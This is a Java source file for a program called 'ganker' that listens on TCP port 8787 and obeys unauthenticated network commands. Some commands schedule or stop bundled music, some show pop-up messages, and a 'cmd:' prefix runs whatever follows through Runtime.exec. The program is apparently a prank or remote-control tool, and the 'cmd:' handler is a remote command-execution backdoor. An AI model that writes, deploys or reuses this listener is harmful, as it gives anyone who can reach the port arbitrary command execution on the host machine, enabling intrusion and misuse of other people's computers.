package ganker;

import java.applet.*;
import java.io.*;
import java.net.*;
import java.util.Scanner;
import javax.swing.JOptionPane;

public class ganker implements Runnable
{
	static boolean isPlaying = false, loop = true;
	static long startTime = -1;
	ServerSocket ss;
	static AudioClip music;
	static int port = 8787;
	public void run()
	{
		music = Applet.newAudioClip(getClass().getResource("/music/music"));
		while(true)
		{
			try
			{
				ss = new ServerSocket(port);
				break;
			}
			catch(IOException e)
			{
				try
				{
					Socket s = new Socket("localhost", port);
					PrintStream ps = new PrintStream(s.getOutputStream());
					ps.println("exit");
					ps.close();
				}
				catch(IOException e2)
				{
					e.printStackTrace();
				}
			}
		}
		try
		{
			while(true)
			{
				Socket s = ss.accept();
				InputStream in = s.getInputStream();
				Scanner scan = new Scanner(in);
				String input = scan.nextLine();
				s.close();
				scan.close();
				try
				{
					startTime = System.currentTimeMillis() + Long.parseLong(input);
				}
				catch(NumberFormatException e)
				{
					if(input.equals("exit"))
					{
						System.exit(0);
					}
					else if(input.equals("stop"))
					{
						startTime = -1;
					}
					else if(input.length() >= 4 && input.substring(0,4).equals("msg:"))
					{
						new dialog(input.substring(4)).start();
					}
					else if(input.length() >= 4 && input.substring(0,4).equals("cmd:"))
					{
						try
						{
							Runtime.getRuntime().exec(input.substring(4));
						}
						catch(Exception e1)
						{
							e1.printStackTrace();
						}
					}
					else if(input.length() >= 5 && input.substring(0,5).equals("loop:"))
					{
						ganker.this.loop = input.substring(5).equals("0")?false:input.substring(5).equals("1")?true:false;
					}
				}
			}
		}
		catch(Exception e)
		{
			e.printStackTrace();
			System.exit(1);
		}
	}
	public static void main(String[] args)
	{
		if(args.length >= 1)
		{
			port = Integer.parseInt(args[0]);
		}
		new Thread(new ganker()).start();
		while(true)
		{
			try
			{
				Thread.sleep(1);
			}
			catch(Exception e)
			{
				e.printStackTrace();
				System.exit(1);
			}
			if(startTime >= 0 && System.currentTimeMillis() >= startTime && isPlaying == false)
			{
				if(loop) music.loop();
				else music.play();
				isPlaying = true;
			}
			else if(startTime < 0 && isPlaying == true)
			{
				music.stop();
				isPlaying = false;
			}
		}
	}
}
class dialog extends Thread
{
	String msg;
	public dialog(String m)
	{
		msg = m;
	}
	public void run()
	{
		JOptionPane.showMessageDialog(null,msg,"",JOptionPane.INFORMATION_MESSAGE);
	}
}